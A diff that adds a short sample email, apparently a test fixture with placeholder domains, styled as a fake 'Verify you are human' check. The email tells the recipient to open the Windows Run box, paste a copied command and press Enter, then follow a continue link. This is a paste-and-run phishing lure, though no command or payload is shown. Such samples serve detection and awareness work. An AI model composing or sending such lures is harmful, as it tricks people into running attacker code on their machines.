@@ -1,0 +1,14 @@
+From: "Security Check" <verify@captcha-check.example>
+To: jane@example.org
+Subject: Verify you are human
+Date: Fri, 20 Nov 2026 09:30:00 +0000
+Message-ID: <20@captcha-check.example>
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+To finish the verification and unlock your document, press the Windows key + =
+R, paste the copied command with Ctrl+V and press Enter. Then click the butto=
+n below to continue.
+
+https://captcha-check.example/continue
